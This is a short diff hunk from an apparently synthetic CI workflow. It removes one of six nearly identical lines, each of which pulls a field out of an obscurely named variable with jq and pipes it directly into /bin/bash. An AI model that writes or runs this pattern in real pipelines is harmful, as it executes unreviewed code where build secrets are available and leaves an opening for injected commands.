@@ -32,7 +32,6 @@ jobs:
           echo $uvbh6479 | jq -r .jbj72 | /bin/bash
           echo $vx1 | jq -r .cm36787 | /bin/bash
           printf '%s' "$pn18412" | jq -r .mhsft58 | /bin/bash
-          printf '%s' "$rbztw0398" | jq -r .tqcjt4540 | /bin/bash
           echo $c3198 | jq -r .wa11 | /bin/bash
 
       - name: Store artifact
